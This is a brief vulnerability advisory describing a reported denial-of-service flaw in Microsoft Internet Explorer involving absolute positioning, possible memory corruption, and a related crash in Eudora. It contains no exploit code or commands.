A problem has been reported in Microsoft Internet Explorer when absolute positioning is used. Because of this, it may be possible to deny service to users of the browser. This issue may be due to memory corruption, however, it is known not at this point if it may be exploited to execute arbitrary code.

It has been reported that the exploit code for this issue may also cause Eudora to crash. This may simply be due to Internet Explorer being set to render HTML content for Eudora.
